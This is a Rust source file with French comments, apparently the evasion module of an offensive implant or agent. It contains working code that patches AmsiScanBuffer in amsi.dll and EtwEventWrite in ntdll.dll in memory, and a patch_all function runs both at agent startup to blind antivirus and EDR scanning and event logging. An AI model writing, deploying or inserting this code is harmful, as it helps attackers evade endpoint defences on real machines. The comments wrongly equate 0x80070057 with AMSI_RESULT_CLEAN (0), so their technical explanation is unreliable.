// evasion/amsi_etw.rs — AMSI bypass et ETW patching
//
// ─────────────────────────────────────────────────────────────
// AMSI (Antimalware Scan Interface)
// ─────────────────────────────────────────────────────────────
// AMSI est une interface Microsoft qui permet aux AV/EDR de scanner
// le contenu en mémoire AVANT qu'il soit exécuté.
// Il intercepte notamment :
//   - Scripts PowerShell (avant exécution)
//   - Scripts WScript/CScript
//   - Invocations .NET réflectives
//   - Certains appels COM
//
// Technique de bypass : patcher AmsiScanBuffer() dans amsi.dll
// pour qu'elle retourne toujours AMSI_RESULT_CLEAN (0).
//
// Fonctionnement du patch :
//   AmsiScanBuffer() est une fonction dans amsi.dll chargée en mémoire.
//   On change les premiers bytes de cette fonction pour forcer un
//   return immédiat avec la valeur 0 (= AMSI_RESULT_CLEAN).
//
//   Avant patch :
//     48 89 5C 24 08    → MOV [RSP+8], RBX
//     48 89 74 24 10    → MOV [RSP+16], RSI
//     ...               → suite normale de la fonction
//
//   Après patch :
//     B8 57 00 07 80    → MOV EAX, 0x80070057 (AMSI_RESULT_CLEAN = 0)
//     C3                → RET
//
// ─────────────────────────────────────────────────────────────
// ETW (Event Tracing for Windows)
// ─────────────────────────────────────────────────────────────
// ETW est le système de logging kernel de Windows.
// Les EDR s'abonnent à des providers ETW pour recevoir des événements :
//   - Microsoft-Windows-Threat-Intelligence → IoC de création de processus
//   - Microsoft-Windows-DotNETRuntime       → exécution .NET
//   - Microsoft-Antimalware-Scan-Interface  → scans AMSI
//
// Technique de bypass : patcher EtwEventWrite() dans ntdll.dll
// pour qu'elle ne log rien (return immédiat).
//
// ATTENTION : Les EDR modernes (CrowdStrike, SentinelOne) détectent
// le patching d'AMSI et ETW. Ils ont des "integrity threads" qui
// vérifient périodiquement l'intégrité de ces fonctions.

/// AmsiPatcher — gère le bypass AMSI
pub struct AmsiPatcher;

impl AmsiPatcher {
    /// patch — patche AmsiScanBuffer pour retourner AMSI_RESULT_CLEAN
    ///
    /// Retourne Ok(()) si le patch a réussi, Err si AMSI n'est pas chargé
    /// ou si les permissions sont insuffisantes.
    #[cfg(target_os = "windows")]
    pub fn patch() -> Result<(), String> {
        use windows_sys::Win32::{
            Foundation::GetLastError,
            System::{
                LibraryLoader::{GetModuleHandleW, GetProcAddress},
                Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ},
            },
        };

        unsafe {
            // 1. Obtenir un handle sur amsi.dll (doit déjà être chargée)
            let amsi_name: Vec<u16> = "amsi.dll\0"
                .encode_utf16()
                .collect();

            let amsi_handle = GetModuleHandleW(amsi_name.as_ptr());
            if amsi_handle == 0 {
                return Err("amsi.dll not loaded in this process".into());
            }

            // 2. Résoudre l'adresse de AmsiScanBuffer
            let func_name = b"AmsiScanBuffer\0";
            let scan_buffer_addr = GetProcAddress(amsi_handle, func_name.as_ptr());

            if scan_buffer_addr.is_none() {
                return Err("AmsiScanBuffer not found".into());
            }

            let addr = scan_buffer_addr.unwrap() as *mut u8;

            // 3. Changer les permissions pour permettre l'écriture
            let patch_size = 6usize;
            let mut old_protect = 0u32;

            if VirtualProtect(
                addr as _,
                patch_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            ) == 0 {
                return Err(format!("VirtualProtect failed: {}", GetLastError()));
            }

            // 4. Écrire le patch
            // MOV EAX, 0x80070057 ; RET
            // Résultat : la fonction retourne immédiatement avec AMSI_RESULT_CLEAN
            //
            // 0x80070057 = AMSI_RESULT_CLEAN dans la convention de retour AMSI
            // (E_INVALIDARG — traité comme "pas de détection" par le runtime)
            let patch: [u8; 6] = [
                0xB8, 0x57, 0x00, 0x07, 0x80,  // MOV EAX, 0x80070057
                0xC3,                            // RET
            ];

            std::ptr::copy_nonoverlapping(
                patch.as_ptr(),
                addr,
                patch.len(),
            );

            // 5. Restaurer les permissions originales
            VirtualProtect(
                addr as _,
                patch_size,
                old_protect,
                &mut old_protect,
            );

            Ok(())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch() -> Result<(), String> {
        Err("AMSI patch: Windows only".into())
    }
}

/// EtwPatcher — désactive le logging ETW
pub struct EtwPatcher;

impl EtwPatcher {
    /// patch — patche EtwEventWrite dans ntdll.dll
    ///
    /// Remplace le début de EtwEventWrite par un RET immédiat.
    /// Les EDR qui dépendent d'ETW deviennent aveugles aux événements
    /// générés dans ce processus.
    ///
    /// NOTE : Cette technique est de plus en plus détectée par les EDR
    /// via "kernel patch protection" et les integrity checks.
    /// Les techniques plus avancées utilisent des ETW provider unhooking
    /// via des mécanismes kernel.
    #[cfg(target_os = "windows")]
    pub fn patch() -> Result<(), String> {
        use windows_sys::Win32::System::{
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
        };

        unsafe {
            // 1. Obtenir ntdll.dll — toujours chargée dans chaque processus Windows
            let ntdll_name: Vec<u16> = "ntdll.dll\0"
                .encode_utf16()
                .collect();

            let ntdll = GetModuleHandleW(ntdll_name.as_ptr());
            if ntdll == 0 {
                return Err("ntdll.dll not found (impossible!)".into());
            }

            // 2. Trouver EtwEventWrite
            let func_name = b"EtwEventWrite\0";
            let etw_write = GetProcAddress(ntdll, func_name.as_ptr());

            if etw_write.is_none() {
                return Err("EtwEventWrite not found".into());
            }

            let addr = etw_write.unwrap() as *mut u8;

            // 3. Patch : RET immédiat (1 byte)
            // La fonction retourne sans rien faire → aucun event loggué
            let mut old_protect = 0u32;
            VirtualProtect(addr as _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect);

            // 0xC3 = RET (x86/x64)
            std::ptr::write_volatile(addr, 0xC3u8);

            VirtualProtect(addr as _, 1, old_protect, &mut old_protect);

            Ok(())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch() -> Result<(), String> {
        Err("ETW patch: Windows only".into())
    }
}

/// patch_all — applique tous les patches d'évasion disponibles
///
/// Appelé en début d'exécution de l'agent.
/// Les erreurs sont ignorées (si AMSI n'est pas chargé, ce n'est pas grave).
pub fn patch_all() {
    let _ = AmsiPatcher::patch();
    let _ = EtwPatcher::patch();
}
